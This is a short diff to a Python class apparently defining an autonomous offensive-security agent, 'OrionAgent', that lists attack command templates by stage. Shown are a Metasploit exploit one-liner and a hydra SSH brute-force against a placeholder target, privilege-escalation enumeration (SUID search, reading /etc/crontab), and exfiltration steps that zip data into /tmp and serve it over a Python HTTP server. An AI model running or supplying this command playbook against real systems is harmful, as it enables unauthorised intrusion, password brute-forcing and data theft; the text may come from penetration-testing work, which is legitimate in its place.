@@ -1119,7 +1119,7 @@ class OrionAgent(AgentInterface, MemorySyncInterface):
                 "msfconsole -x 'use exploit/SERVICE_PATH; set RHOSTS TARGET_IP; exploit'",
                 "hydra -L /usr/share/wordlists/user.txt -P /usr/share/wordlists/rockyou.txt ssh://TARGET_IP",
             ],
-            "privesc": ["find / -perm -u=s -type f 2>/dev/null", "sudo -l", "uname -a"],
+            "privesc": ["find / -perm -u=s -type f 2>/dev/null", "uname -a", "cat /etc/crontab"],
             "exfiltrate": [
                 "zip -r /tmp/data.zip /path/to/data",
                 "python3 -m http.server",
